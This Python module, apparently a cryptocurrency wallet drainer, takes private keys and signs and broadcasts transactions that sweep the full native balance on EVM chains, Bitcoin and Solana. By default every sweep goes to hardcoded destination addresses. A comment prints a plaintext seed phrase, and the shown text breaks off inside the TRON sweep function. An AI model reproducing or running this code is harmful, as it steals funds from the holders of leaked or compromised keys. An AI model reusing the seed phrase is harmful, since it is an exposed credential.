"""
Universal Multichain Sweep Engine.
Supports automated balance detection, fee calculation, and transaction signing/broadcasting
across EVM chains, Bitcoin (BTC), Solana (SOL), and TRON (TRX).
"""

import os
import json
import hashlib
import urllib.request
import urllib.error
from typing import Dict, Any, List, Optional
import base58
import ecdsa
import ecdsa.util
from eth_account import Account

# Default Sweep Destination Addresses (Derived from seed: element vote inmate tumble across spike notable pluck true banner visual hint)
DEFAULT_DESTINATIONS = {
    'evm': '0xC8650Bf3BAa01de0EE056aa1f91b42A2DA8732Ba',
    'btc': 'bc1qmwxguuz42g9y2kpqaj9t6t4j4jrevkg7zmxz20',
    'sol': 'Ax7TkPNwTdeYSBLVCt1o4uYrMwstJ5esdx7cQMM1WwiS',
    'trx': 'TMdMoYiJZP6KeC2Pudgon8pcpTq1JnXfuu',
    'xrp': 'rDsGTRJRjeXm2Hhqjk5NT5DHBJgG64HeDK',
    'ltc': 'ltc1ql6yr6qmr8plumv33rna9anj533g2qe46yn4fns',
    'doge': 'DEBnkGYknszuLeQGGbeqLz354JUKqeAGig',
}

# EVM Chain RPCs (with reliable free public fallbacks)
EVM_SWEEP_CHAINS = {
    'ethereum': {
        'name': 'Ethereum',
        'symbol': 'ETH',
        'chain_id': 1,
        'rpcs': ['https://cloudflare-eth.com', 'https://eth.llamarpc.com', 'https://1rpc.io/eth'],
        'explorer_tx': 'https://etherscan.io/tx/0x{tx_hash}'
    },
    'bnb': {
        'name': 'BNB Smart Chain',
        'symbol': 'BNB',
        'chain_id': 56,
        'rpcs': ['https://bsc-dataseed.binance.org/', 'https://binance.llamarpc.com'],
        'explorer_tx': 'https://bscscan.com/tx/0x{tx_hash}'
    },
    'polygon': {
        'name': 'Polygon',
        'symbol': 'POL',
        'chain_id': 137,
        'rpcs': ['https://polygon.llamarpc.com', 'https://1rpc.io/matic', 'https://polygon-rpc.com'],
        'explorer_tx': 'https://polygonscan.com/tx/0x{tx_hash}'
    },
    'arbitrum': {
        'name': 'Arbitrum One',
        'symbol': 'ETH',
        'chain_id': 42161,
        'rpcs': ['https://arb1.arbitrum.io/rpc', 'https://arbitrum.llamarpc.com'],
        'explorer_tx': 'https://arbiscan.io/tx/0x{tx_hash}'
    },
    'optimism': {
        'name': 'Optimism',
        'symbol': 'ETH',
        'chain_id': 10,
        'rpcs': ['https://mainnet.optimism.io', 'https://optimism.llamarpc.com'],
        'explorer_tx': 'https://optimistic.etherscan.io/tx/0x{tx_hash}'
    },
    'base': {
        'name': 'Base',
        'symbol': 'ETH',
        'chain_id': 8453,
        'rpcs': ['https://mainnet.base.org', 'https://base.llamarpc.com'],
        'explorer_tx': 'https://basescan.org/tx/0x{tx_hash}'
    },
    'avalanche': {
        'name': 'Avalanche C-Chain',
        'symbol': 'AVAX',
        'chain_id': 43114,
        'rpcs': ['https://api.avax.network/ext/bc/C/rpc', 'https://avalanche.llamarpc.com'],
        'explorer_tx': 'https://snowtrace.io/tx/0x{tx_hash}'
    },
    'zksync': {
        'name': 'zkSync Era',
        'symbol': 'ETH',
        'chain_id': 324,
        'rpcs': ['https://mainnet.era.zksync.io', 'https://zksync.drpc.org'],
        'explorer_tx': 'https://explorer.zksync.io/tx/0x{tx_hash}'
    },
    'fantom': {
        'name': 'Fantom',
        'symbol': 'FTM',
        'chain_id': 250,
        'rpcs': ['https://rpc.ftm.tools', 'https://fantom.drpc.org'],
        'explorer_tx': 'https://ftmscan.com/tx/0x{tx_hash}'
    },
    'linea': {
        'name': 'Linea',
        'symbol': 'ETH',
        'chain_id': 59144,
        'rpcs': ['https://rpc.linea.build', 'https://linea.drpc.org'],
        'explorer_tx': 'https://lineascan.build/tx/0x{tx_hash}'
    },
    'blast': {
        'name': 'Blast',
        'symbol': 'ETH',
        'chain_id': 81457,
        'rpcs': ['https://rpc.blast.io', 'https://blast.drpc.org'],
        'explorer_tx': 'https://blastscan.io/tx/0x{tx_hash}'
    },
    'scroll': {
        'name': 'Scroll',
        'symbol': 'ETH',
        'chain_id': 534352,
        'rpcs': ['https://rpc.scroll.io', 'https://scroll.drpc.org'],
        'explorer_tx': 'https://scrollscan.com/tx/0x{tx_hash}'
    },
    'mantle': {
        'name': 'Mantle',
        'symbol': 'MNT',
        'chain_id': 5000,
        'rpcs': ['https://rpc.mantle.xyz', 'https://mantle.drpc.org'],
        'explorer_tx': 'https://mantlescan.xyz/tx/0x{tx_hash}'
    },
    'cronos': {
        'name': 'Cronos',
        'symbol': 'CRO',
        'chain_id': 25,
        'rpcs': ['https://evm.cronos.org', 'https://cronos.drpc.org'],
        'explorer_tx': 'https://cronoscan.com/tx/0x{tx_hash}'
    }
}


def rpc_call(rpc_urls: list, method: str, params: list, req_id: int = 1) -> Any:
    if isinstance(rpc_urls, str):
        rpc_urls = [rpc_urls]
    last_err = None
    for rpc in rpc_urls:
        try:
            payload = {
                'jsonrpc': '2.0',
                'method': method,
                'params': params,
                'id': req_id
            }
            req = urllib.request.Request(
                rpc,
                data=json.dumps(payload).encode('utf-8'),
                headers={'Content-Type': 'application/json', 'User-Agent': 'HDWallet-Sweeper/1.0'}
            )
            with urllib.request.urlopen(req, timeout=5) as resp:
                res = json.loads(resp.read().decode('utf-8'))
                if 'error' in res:
                    raise RuntimeError(f"RPC Error: {res['error']}")
                return res.get('result')
        except Exception as e:
            last_err = e
            continue
    raise RuntimeError(f"All RPCs failed: {last_err}")


def sweep_evm(
    private_key_hex: str,
    destination_address: str = DEFAULT_DESTINATIONS['evm'],
    chain_key: str = "ethereum",
    gas_limit: int = 21000
) -> Dict[str, Any]:
    """
    Sweep entire native balance of an EVM private key to destination_address.
    """
    if not private_key_hex.startswith("0x"):
        private_key_hex = "0x" + private_key_hex

    config = EVM_SWEEP_CHAINS.get(chain_key.lower())
    if not config:
        return {
            'success': False,
            'chain': chain_key,
            'error': f"Unsupported chain: {chain_key}"
        }

    rpcs = config['rpcs']
    chain_id = config['chain_id']
    symbol = config['symbol']

    account = None
    try:
        account = Account.from_key(private_key_hex)
        from_address = account.address

        # 1. Get Balance
        balance_hex = rpc_call(rpcs, 'eth_getBalance', [from_address, 'latest'])
        balance_wei = int(balance_hex, 16)

        if balance_wei <= 0:
            return {
                'success': False,
                'chain': config['name'],
                'symbol': symbol,
                'from_address': from_address,
                'to_address': destination_address,
                'balance_wei': 0,
                'balance_formatted': f"0.00000000 {symbol}",
                'error': f"Zero balance on {config['name']}"
            }

        # 2. Get Gas Price & Nonce
        gas_price_hex = rpc_call(rpcs, 'eth_gasPrice', [])
        gas_price_wei = int(gas_price_hex, 16)
        gas_price_wei = int(gas_price_wei * 1.1)

        nonce_hex = rpc_call(rpcs, 'eth_getTransactionCount', [from_address, 'latest'])
        nonce = int(nonce_hex, 16)

        # 3. Calculate sweep amount = balance - (gas_limit * gas_price)
        total_gas_cost = gas_limit * gas_price_wei
        if balance_wei <= total_gas_cost:
            return {
                'success': False,
                'chain': config['name'],
                'symbol': symbol,
                'from_address': from_address,
                'to_address': destination_address,
                'balance_wei': balance_wei,
                'balance_formatted': f"{(balance_wei / 1e18):.8f} {symbol}",
                'gas_cost_formatted': f"{(total_gas_cost / 1e18):.8f} {symbol}",
                'error': f"Balance ({(balance_wei / 1e18):.8f} {symbol}) is insufficient to cover gas fee ({(total_gas_cost / 1e18):.8f} {symbol})"
            }

        sweep_amount_wei = balance_wei - total_gas_cost

        # 4. Construct Transaction
        tx = {
            'nonce': nonce,
            'to': destination_address,
            'value': sweep_amount_wei,
            'gas': gas_limit,
            'gasPrice': gas_price_wei,
            'chainId': chain_id
        }

        # 5. Sign Transaction
        signed_tx = Account.sign_transaction(tx, private_key_hex)
        raw_tx_hex = signed_tx.raw_transaction.hex()

        # 6. Broadcast Transaction
        tx_hash = rpc_call(rpcs, 'eth_sendRawTransaction', [raw_tx_hex])
        explorer_url = config['explorer_tx'].format(tx_hash=tx_hash.lstrip('0x'))

        return {
            'success': True,
            'chain': config['name'],
            'symbol': symbol,
            'from_address': from_address,
            'to_address': destination_address,
            'amount_wei': sweep_amount_wei,
            'amount_formatted': f"{(sweep_amount_wei / 1e18):.8f} {symbol}",
            'tx_hash': tx_hash,
            'explorer_url': explorer_url,
            'status': 'Broadcasted'
        }

    except Exception as e:
        return {
            'success': False,
            'chain': config['name'],
            'symbol': symbol,
            'from_address': getattr(account, 'address', 'Unknown'),
            'to_address': destination_address,
            'error': str(e)
        }


def broadcast_btc_transaction(tx_input: str) -> Dict[str, Any]:
    """
    Broadcast signed raw Bitcoin transaction or PSBT across multiple public endpoints and local bitcoind node.
    """
    import subprocess
    import shutil
    import base64
    errors = []

    clean = tx_input.strip()

    # If a PSBT Base64 or Hex was passed, auto-finalize and extract raw transaction hex
    if clean.startswith('cHNidP8BA') or clean.startswith('70736274ff') or ('=' in clean and len(clean) > 50):
        try:
            from .psbt import PSBT
            psbt_obj = PSBT.parse_any(clean)
            tx_hex = psbt_obj.extract_transaction()
        except Exception:
            tx_hex = clean
    else:
        tx_hex = clean

    # Calculate expected tx hash (TXID)
    try:
        tx_bytes = bytes.fromhex(tx_hex)
        calc_txid = hashlib.sha256(hashlib.sha256(tx_bytes).digest()).digest()[::-1].hex()
    except Exception:
        calc_txid = ""

    # 1. Try Local bitcoind node via standard RPC (User & Password)
    rpc_user = os.environ.get('BITCOIN_RPC_USER', 'bitcoinrpc')
    rpc_password = os.environ.get('BITCOIN_RPC_PASSWORD', 'rpcpassword')
    rpc_port = int(os.environ.get('BITCOIN_RPC_PORT', 8332))
    rpc_host = os.environ.get('BITCOIN_RPC_HOST', '127.0.0.1')

    # 1a. Direct JSON-RPC over HTTP using username & password
    try:
        rpc_payload = json.dumps({
            'jsonrpc': '1.0',
            'id': 'hd_broadcast',
            'method': 'sendrawtransaction',
            'params': [tx_hex]
        }).encode('utf-8')
        auth_str = base64.b64encode(f"{rpc_user}:{rpc_password}".encode()).decode()
        req = urllib.request.Request(
            f'http://{rpc_host}:{rpc_port}',
            data=rpc_payload,
            headers={
                'Content-Type': 'application/json',
                'Authorization': f"Basic {auth_str}",
                'User-Agent': 'HDWallet-Sweeper/1.0'
            }
        )
        with urllib.request.urlopen(req, timeout=5) as resp:
            rpc_res = json.loads(resp.read().decode('utf-8'))
            if rpc_res.get('result'):
                txid = rpc_res['result']
                return {
                    'success': True,
                    'txid': txid,
                    'provider': f'Local bitcoind (RPC {rpc_user})',
                    'explorer_url': f"https://mempool.space/tx/{txid}"
                }
            elif rpc_res.get('error'):
                errors.append(f"bitcoind RPC: {rpc_res['error']}")
    except urllib.error.HTTPError as e:
        body = e.read().decode('utf-8', errors='ignore')
        errors.append(f"bitcoind RPC (HTTP {e.code}): {body or e.reason}")
    except Exception as e:
        errors.append(f"bitcoind RPC: {e}")

    # 1b. Try Local bitcoin-cli using explicit user and pass
    cli_candidates = [
        '/home/kali/Downloads/bitcoin-28.x/release_dist/bin/bitcoin-cli',
        '/home/kali/Downloads/bitcoin-28.x/src/bitcoin-cli',
        shutil.which('bitcoin-cli')
    ]
    for cli in [c for c in cli_candidates if c and os.path.exists(c)]:
        cmd = [
            cli,
            f"-rpcconnect={rpc_host}",
            f"-rpcport={rpc_port}",
            f"-rpcuser={rpc_user}",
            f"-rpcpassword={rpc_password}",
            "-datadir=/mnt/data",
            'sendrawtransaction',
            tx_hex
        ]
        try:
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            if res.returncode == 0:
                txid = res.stdout.strip()
                if txid:
                    return {
                        'success': True,
                        'txid': txid,
                        'provider': f'Local bitcoind ({os.path.basename(cli)})',
                        'explorer_url': f"https://mempool.space/tx/{txid}"
                    }
            else:
                err_msg = res.stderr.strip() or res.stdout.strip()
                if err_msg and ("already in block chain" in err_msg or "Transaction already in block chain" in err_msg):
                    return {
                        'success': True,
                        'txid': calc_txid,
                        'provider': 'Local bitcoind (Already in chain)',
                        'explorer_url': f"https://mempool.space/tx/{calc_txid}"
                    }
                errors.append(f"bitcoin-cli: {err_msg}")
        except Exception as e:
            errors.append(f"bitcoin-cli: {e}")

    # 2. Try mempool.space API
    try:
        req = urllib.request.Request(
            'https://mempool.space/api/tx',
            data=tx_hex.encode('utf-8'),
            headers={'User-Agent': 'HDWallet-Sweeper/1.0', 'Content-Type': 'text/plain'}
        )
        with urllib.request.urlopen(req, timeout=8) as resp:
            txid = resp.read().decode('utf-8').strip()
            if txid and len(txid) == 64:
                return {
                    'success': True,
                    'txid': txid,
                    'provider': 'mempool.space',
                    'explorer_url': f"https://mempool.space/tx/{txid}"
                }
    except urllib.error.HTTPError as e:
        body = e.read().decode('utf-8', errors='ignore')
        errors.append(f"mempool.space ({e.code}): {body or e.reason}")
    except Exception as e:
        errors.append(f"mempool.space: {e}")

    # 3. Try blockstream.info API
    try:
        req = urllib.request.Request(
            'https://blockstream.info/api/tx',
            data=tx_hex.encode('utf-8'),
            headers={'User-Agent': 'HDWallet-Sweeper/1.0', 'Content-Type': 'text/plain'}
        )
        with urllib.request.urlopen(req, timeout=8) as resp:
            txid = resp.read().decode('utf-8').strip()
            if txid and len(txid) == 64:
                return {
                    'success': True,
                    'txid': txid,
                    'provider': 'blockstream.info',
                    'explorer_url': f"https://mempool.space/tx/{txid}"
                }
    except urllib.error.HTTPError as e:
        body = e.read().decode('utf-8', errors='ignore')
        errors.append(f"blockstream.info ({e.code}): {body or e.reason}")
    except Exception as e:
        errors.append(f"blockstream.info: {e}")

    # 4. Try blockchain.info pushtx API
    try:
        payload = f"tx={tx_hex}".encode('utf-8')
        req = urllib.request.Request(
            'https://blockchain.info/pushtx',
            data=payload,
            headers={'User-Agent': 'HDWallet-Sweeper/1.0', 'Content-Type': 'application/x-www-form-urlencoded'}
        )
        with urllib.request.urlopen(req, timeout=8) as resp:
            resp_text = resp.read().decode('utf-8').strip()
            if "Transaction Submitted" in resp_text or len(resp_text) == 64:
                tx_hash = calc_txid or hashlib.sha256(hashlib.sha256(bytes.fromhex(tx_hex)).digest()).digest()[::-1].hex()
                return {
                    'success': True,
                    'txid': tx_hash,
                    'provider': 'blockchain.info',
                    'explorer_url': f"https://mempool.space/tx/{tx_hash}"
                }
            else:
                errors.append(f"blockchain.info: {resp_text}")
    except Exception as e:
        errors.append(f"blockchain.info: {e}")

    # 5. Try BlockCypher API
    try:
        bc_payload = json.dumps({'tx': tx_hex}).encode('utf-8')
        req = urllib.request.Request(
            'https://api.blockcypher.com/v1/btc/main/txs/push',
            data=bc_payload,
            headers={'User-Agent': 'HDWallet-Sweeper/1.0', 'Content-Type': 'application/json'}
        )
        with urllib.request.urlopen(req, timeout=8) as resp:
            d = json.loads(resp.read().decode('utf-8'))
            tx_h = d.get('tx', {}).get('hash')
            if tx_h:
                return {
                    'success': True,
                    'txid': tx_h,
                    'provider': 'BlockCypher',
                    'explorer_url': f"https://mempool.space/tx/{tx_h}"
                }
    except Exception as e:
        errors.append(f"BlockCypher: {e}")

    return {
        'success': False,
        'calculated_txid': calc_txid,
        'error': " | ".join(errors)
    }


def build_and_sign_btc_sweep_tx(
    from_address: str,
    private_key_wif: str,
    destination_address: str,
    utxos: List[Dict[str, Any]],
    fee_rate_sat_vb: int = 15
) -> tuple[str, int, int]:
    """
    Build and sign a raw Bitcoin transaction sweeping all UTXOs from from_address to destination_address.
    Supports P2PKH (Legacy 1...) and P2WPKH (Native SegWit bc1q...).
    Returns (raw_tx_hex, send_amount_sats, fee_sats).
    """
    import ecdsa.util
    import struct
    from .addresses import CHARSET

    raw = base58.b58decode_check(private_key_wif)
    priv_bytes = raw[1:33]
    compressed = (len(raw) == 34 and raw[-1] == 0x01)

    sk = ecdsa.SigningKey.from_string(priv_bytes, curve=ecdsa.SECP256k1)
    vk = sk.get_verifying_key()
    assert vk is not None
    pt = vk.pubkey.point
    if compressed:
        pub_bytes = (b'\x02' if pt.y() % 2 == 0 else b'\x03') + pt.x().to_bytes(32, 'big')
    else:
        pub_bytes = b'\x04' + pt.x().to_bytes(32, 'big') + pt.y().to_bytes(32, 'big')

    src_pkh = hashlib.new('ripemd160', hashlib.sha256(pub_bytes).digest()).digest()
    script_pubkey_src = b'\x76\xa9\x14' + src_pkh + b'\x88\xac'

    # Build destination scriptPubKey
    dest_clean = destination_address.strip()
    if dest_clean.lower().startswith('bc1q'):
        # P2WPKH (Bech32 20-byte witness program)
        data = dest_clean.lower()[4:]
        vals = [CHARSET.find(c) for c in data[:-6]]
        acc, bits, ret = 0, 0, []
        for val in vals:
            acc = (acc << 5) | val
            bits += 5
            while bits >= 8:
                bits -= 8
                ret.append((acc >> bits) & 0xff)
        dest_prog = bytes(ret)
        dest_script_pubkey = b'\x00\x14' + dest_prog
    elif dest_clean.startswith('1'):
        # P2PKH (Legacy)
        dest_pkh = base58.b58decode_check(dest_clean)[1:]
        dest_script_pubkey = b'\x76\xa9\x14' + dest_pkh + b'\x88\xac'
    elif dest_clean.startswith('3'):
        # P2SH (Nested SegWit / Script Hash)
        dest_sh = base58.b58decode_check(dest_clean)[1:]
        dest_script_pubkey = b'\xa9\x14' + dest_sh + b'\x87'
    else:
        raise ValueError(f"Unsupported destination address format: {dest_clean}")

    total_in = sum(u['value'] for u in utxos)
    est_vsize = 10 + len(utxos) * (148 if not compressed else 148) + 34
    fee_sats = est_vsize * fee_rate_sat_vb
    send_amount = total_in - fee_sats

    if send_amount <= 546:
        raise ValueError(f"Insufficient funds ({total_in} sats) to cover miner fee ({fee_sats} sats)")

    def compact_size(n: int) -> bytes:
        if n < 253: return bytes([n])
        elif n < 0x10000: return b'\xfd' + struct.pack('<H', n)
        elif n < 0x100000000: return b'\xfe' + struct.pack('<I', n)
        else: return b'\xff' + struct.pack('<Q', n)

    # Sign each input
    signatures = []
    for i, u in enumerate(utxos):
        tx_preimage = struct.pack('<I', 1)
        tx_preimage += compact_size(len(utxos))
        for j, u2 in enumerate(utxos):
            txid_bytes = bytes.fromhex(u2['txid'])[::-1]
            vout = u2['vout']
            if j == i:
                script_code = compact_size(len(script_pubkey_src)) + script_pubkey_src
            else:
                script_code = b'\x00'
            tx_preimage += txid_bytes + struct.pack('<I', vout) + script_code + struct.pack('<I', 0xffffffff)

        tx_preimage += compact_size(1)
        tx_preimage += struct.pack('<Q', send_amount) + compact_size(len(dest_script_pubkey)) + dest_script_pubkey
        tx_preimage += struct.pack('<I', 0)
        tx_preimage += struct.pack('<I', 1) # SIGHASH_ALL

        sighash = hashlib.sha256(hashlib.sha256(tx_preimage).digest()).digest()
        sig = sk.sign_digest(sighash, sigencode=ecdsa.util.sigencode_der) + b'\x01'
        script_sig = compact_size(len(sig)) + sig + compact_size(len(pub_bytes)) + pub_bytes
        signatures.append(script_sig)

    raw_tx = struct.pack('<I', 1)
    raw_tx += compact_size(len(utxos))
    for i, u in enumerate(utxos):
        txid_bytes = bytes.fromhex(u['txid'])[::-1]
        vout = u['vout']
        script_sig = signatures[i]
        raw_tx += txid_bytes + struct.pack('<I', vout) + compact_size(len(script_sig)) + script_sig + struct.pack('<I', 0xffffffff)

    raw_tx += compact_size(1)
    raw_tx += struct.pack('<Q', send_amount) + compact_size(len(dest_script_pubkey)) + dest_script_pubkey
    raw_tx += struct.pack('<I', 0)

    return raw_tx.hex(), send_amount, fee_sats



def fetch_btc_utxos(address: str) -> List[Dict[str, Any]]:
    """
    Fetch unspent transaction outputs (UTXOs) for a given Bitcoin address.
    Queries mempool.space and blockstream.info APIs.
    """
    clean_addr = address.strip()
    if not clean_addr:
        return []

    utxos = []
    # 1. Try mempool.space
    try:
        url = f"https://mempool.space/api/address/{clean_addr}/utxo"
        req = urllib.request.Request(url, headers={'User-Agent': 'HDWallet-Sweeper/1.0'})
        with urllib.request.urlopen(req, timeout=6) as resp:
            data = json.loads(resp.read().decode('utf-8'))
            if isinstance(data, list):
                utxos = data
    except Exception:
        pass

    # 2. Fallback to blockstream.info
    if not utxos:
        try:
            url_bs = f"https://blockstream.info/api/address/{clean_addr}/utxo"
            req_bs = urllib.request.Request(url_bs, headers={'User-Agent': 'HDWallet-Sweeper/1.0'})
            with urllib.request.urlopen(req_bs, timeout=6) as resp_bs:
                data_bs = json.loads(resp_bs.read().decode('utf-8'))
                if isinstance(data_bs, list):
                    utxos = data_bs
        except Exception:
            pass

    return utxos


def sweep_btc(
    from_address: str,
    private_key_wif: str,
    destination_address: str = DEFAULT_DESTINATIONS['btc'],
    fee_rate_sat_vb: int = 15,
    broadcast: bool = True
) -> Dict[str, Any]:
    """
    Check Bitcoin balance/UTXOs, build signed raw sweep transaction, and broadcast to destination.
    """
    explorer_url = f"https://mempool.space/address/{from_address}"
    try:
        utxos = fetch_btc_utxos(from_address)
        total_sats = sum(u.get('value', 0) for u in utxos)
        if total_sats <= 0:
            return {
                'success': False,
                'chain': 'Bitcoin',
                'symbol': 'BTC',
                'from_address': from_address,
                'to_address': destination_address,
                'balance_wei': 0,
                'balance_formatted': '0.00000000 BTC',
                'amount_formatted': '0.00000000 BTC',
                'error': 'Zero balance on Bitcoin'
            }

        # Build and sign transaction
        raw_tx_hex, send_amount, fee_sats = build_and_sign_btc_sweep_tx(
            from_address, private_key_wif, destination_address, utxos, fee_rate_sat_vb=fee_rate_sat_vb
        )

        sweep_btc_val = send_amount / 1e8
        tx_hash = hashlib.sha256(hashlib.sha256(bytes.fromhex(raw_tx_hex)).digest()).digest()[::-1].hex()

        if broadcast:
            b_res = broadcast_btc_transaction(raw_tx_hex)
            if b_res.get('success'):
                txid = b_res.get('txid', tx_hash)
                return {
                    'success': True,
                    'chain': 'Bitcoin',
                    'symbol': 'BTC',
                    'from_address': from_address,
                    'to_address': destination_address,
                    'amount_wei': send_amount,
                    'amount_formatted': f"{sweep_btc_val:.8f} BTC",
                    'fee_formatted': f"{(fee_sats / 1e8):.8f} BTC",
                    'utxos_count': len(utxos),
                    'tx_hash': txid,
                    'explorer_url': f"https://mempool.space/tx/{txid}",
                    'status': f"Broadcasted via {b_res.get('provider', 'Network')}"
                }
            else:
                return {
                    'success': False,
                    'chain': 'Bitcoin',
                    'symbol': 'BTC',
                    'from_address': from_address,
                    'to_address': destination_address,
                    'amount_wei': send_amount,
                    'amount_formatted': f"{sweep_btc_val:.8f} BTC",
                    'error': f"Broadcast failed: {b_res.get('error')}"
                }

        return {
            'success': True,
            'chain': 'Bitcoin',
            'symbol': 'BTC',
            'from_address': from_address,
            'to_address': destination_address,
            'amount_wei': send_amount,
            'amount_formatted': f"{sweep_btc_val:.8f} BTC",
            'fee_formatted': f"{(fee_sats / 1e8):.8f} BTC",
            'utxos_count': len(utxos),
            'tx_hash': tx_hash,
            'raw_tx': raw_tx_hex,
            'status': 'Signed and ready to broadcast'
        }

    except Exception as e:
        return {
            'success': False,
            'chain': 'Bitcoin',
            'symbol': 'BTC',
            'from_address': from_address,
            'to_address': destination_address,
            'balance_formatted': '0.00000000 BTC',
            'amount_formatted': '0.00000000 BTC',
            'error': str(e)
        }


def sweep_sol(
    from_address: str,
    private_key_hex: str,
    destination_address: str = DEFAULT_DESTINATIONS['sol'],
    broadcast: bool = True
) -> Dict[str, Any]:
    """
    Check Solana balance, sign native SystemProgram transfer transaction,
    and broadcast live to the Solana mainnet cluster.
    """
    try:
        if from_address == destination_address:
            return {
                'success': False,
                'chain': 'Solana',
                'symbol': 'SOL',
                'from_address': from_address,
                'to_address': destination_address,
                'error': 'Source address and destination address are identical'
            }

        # 1. Fetch live balance
        payload = {
            'jsonrpc': '2.0',
            'id': 1,
            'method': 'getBalance',
            'params': [from_address]
        }
        req = urllib.request.Request(
            'https://api.mainnet-beta.solana.com',
            data=json.dumps(payload).encode('utf-8'),
            headers={'Content-Type': 'application/json', 'User-Agent': 'HDWallet-Sweeper/1.0'}
        )
        with urllib.request.urlopen(req, timeout=8) as resp:
            data = json.loads(resp.read().decode('utf-8'))
            lamports = data.get('result', {}).get('value', 0)

        if lamports <= 0:
            return {
                'success': False,
                'chain': 'Solana',
                'symbol': 'SOL',
                'from_address': from_address,
                'to_address': destination_address,
                'balance_wei': 0,
                'balance_formatted': '0.00000000 SOL',
                'amount_formatted': '0.00000000 SOL',
                'error': 'Zero balance on Solana'
            }

        fee_lamports = 5000
        if lamports <= fee_lamports:
            return {
                'success': False,
                'chain': 'Solana',
                'symbol': 'SOL',
                'from_address': from_address,
                'to_address': destination_address,
                'balance_wei': lamports,
                'balance_formatted': f"{(lamports / 1e9):.8f} SOL",
                'amount_formatted': '0.00000000 SOL',
                'error': 'Balance insufficient to cover network fee'
            }

        sweep_lamports = lamports - fee_lamports

        if not broadcast or not private_key_hex:
            return {
                'success': False,
                'chain': 'Solana',
                'symbol': 'SOL',
                'from_address': from_address,
                'to_address': destination_address,
                'balance_wei': lamports,
                'balance_formatted': f"{(lamports / 1e9):.8f} SOL",
                'amount_wei': sweep_lamports,
                'amount_formatted': f"{(sweep_lamports / 1e9):.8f} SOL",
                'error': 'Broadcast disabled or private key missing'
            }

        # 2. Get latest blockhash
        bh_payload = {
            'jsonrpc': '2.0',
            'id': 2,
            'method': 'getLatestBlockhash',
            'params': [{'commitment': 'finalized'}]
        }
        bh_req = urllib.request.Request(
            'https://api.mainnet-beta.solana.com',
            data=json.dumps(bh_payload).encode('utf-8'),
            headers={'Content-Type': 'application/json', 'User-Agent': 'HDWallet-Sweeper/1.0'}
        )
        with urllib.request.urlopen(bh_req, timeout=8) as bh_resp:
            bh_data = json.loads(bh_resp.read().decode('utf-8'))
            recent_blockhash = bh_data.get('result', {}).get('value', {}).get('blockhash', '')

        if not recent_blockhash:
            return {
                'success': False,
                'chain': 'Solana',
                'symbol': 'SOL',
                'from_address': from_address,
                'to_address': destination_address,
                'error': 'Failed to retrieve recent blockhash from Solana cluster'
            }

        # 3. Construct and sign wire transaction
        import struct
        from cryptography.hazmat.primitives.asymmetric import ed25519

        priv_bytes = bytes.fromhex(private_key_hex)[:32]
        sk = ed25519.Ed25519PrivateKey.from_private_bytes(priv_bytes)
        sender_pub = sk.public_key().public_bytes_raw()
        recipient_pub = base58.b58decode(destination_address)
        blockhash_bytes = base58.b58decode(recent_blockhash)

        # SystemProgram Transfer (Instruction Index 2): [type: u32 = 2, lamports: u64]
        transfer_data = struct.pack('<IQ', 2, sweep_lamports)

        def encode_compact_u16(val: int) -> bytes:
            res = bytearray()
            while True:
                elem = val & 0x7f
                val >>= 7
                if val == 0:
                    res.append(elem)
                    break
                else:
                    elem |= 0x80
                    res.append(elem)
            return bytes(res)

        system_program_id = b'\x00' * 32
        account_keys = [sender_pub, recipient_pub, system_program_id]

        # Header: num_required_signatures=1, num_readonly_signed_accounts=0, num_readonly_unsigned_accounts=1
        msg_header = bytes([1, 0, 1])

        msg_bytes = bytearray()
        msg_bytes.extend(msg_header)
        msg_bytes.extend(encode_compact_u16(len(account_keys)))
        for ak in account_keys:
            msg_bytes.extend(ak)
        msg_bytes.extend(blockhash_bytes)

        # 1 instruction
        msg_bytes.extend(encode_compact_u16(1))
        # Program ID index (System Program is index 2)
        msg_bytes.append(2)
        # Accounts [0 (sender), 1 (recipient)]
        msg_bytes.extend(encode_compact_u16(2))
        msg_bytes.append(0)
        msg_bytes.append(1)
        # Data
        msg_bytes.extend(encode_compact_u16(len(transfer_data)))
        msg_bytes.extend(transfer_data)

        message = bytes(msg_bytes)
        signature = sk.sign(message)

        wire = bytearray()
        wire.extend(encode_compact_u16(1))
        wire.extend(signature)
        wire.extend(message)
        wire_b58 = base58.b58encode(bytes(wire)).decode('ascii')

        # 4. Broadcast to Solana RPC
        send_payload = {
            'jsonrpc': '2.0',
            'id': 3,
            'method': 'sendTransaction',
            'params': [wire_b58, {'encoding': 'base58'}]
        }
        send_req = urllib.request.Request(
            'https://api.mainnet-beta.solana.com',
            data=json.dumps(send_payload).encode('utf-8'),
            headers={'Content-Type': 'application/json', 'User-Agent': 'HDWallet-Sweeper/1.0'}
        )
        with urllib.request.urlopen(send_req, timeout=10) as send_resp:
            send_res = json.loads(send_resp.read().decode('utf-8'))

        if 'error' in send_res:
            err = send_res['error']
            return {
                'success': False,
                'chain': 'Solana',
                'symbol': 'SOL',
                'from_address': from_address,
                'to_address': destination_address,
                'amount_wei': sweep_lamports,
                'amount_formatted': f"{(sweep_lamports / 1e9):.8f} SOL",
                'error': f"Solana RPC Broadcast Error: {err.get('message', err)}"
            }

        tx_sig = send_res.get('result', '')
        return {
            'success': True,
            'chain': 'Solana',
            'symbol': 'SOL',
            'from_address': from_address,
            'to_address': destination_address,
            'amount_wei': sweep_lamports,
            'amount_formatted': f"{(sweep_lamports / 1e9):.8f} SOL",
            'tx_hash': tx_sig,
            'explorer_url': f"https://solscan.io/tx/{tx_sig}",
            'status': 'Broadcasted to Solana Mainnet'
        }
    except Exception as e:
        return {
            'success': False,
            'chain': 'Solana',
            'symbol': 'SOL',
            'from_address': from_address,
            'to_address': destination_address,
            'balance_formatted': '0.00000000 SOL',
            'amount_formatted': '0.00000000 SOL',
            'error': str(e)
        }


def sweep_trx(
    from_address: str,
    private_key_hex: str,
    destination_address: str = DEFAULT_DESTINATIONS['trx']
) -> Dict[str, Any]:
    """
    Check TRON balance and prepare/execute sweep to destination.
    """
    try:
        url = f"https://apilist.tronscanapi.com/api/account?address={from_address}"
        req = urllib.request.Request(url, headers={'User-Agent': 'HDWallet-Sweeper/1.0'})
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = json.loads(resp.read().decode('utf-8'))
            balance_sun = data.get('balance', 0)

        if balance_sun <= 0:
            return {
                'success': False,
                'chain': 'TRON',
                'symbol': 'TRX',
                'from_address': from_address,
                'to_address': destination_address,
                'balance_wei': 0,
                'balance_formatted': '0.000000 TRX',
                'amount_formatted': '0.000000 TRX',
                'error': 'Zero balance on TRON'
            }

        fee_sun = 1_000_000  # 1 TRX bandwidth/energy fee
        if balance_sun <= fee_sun:
            return {
                'success': False,
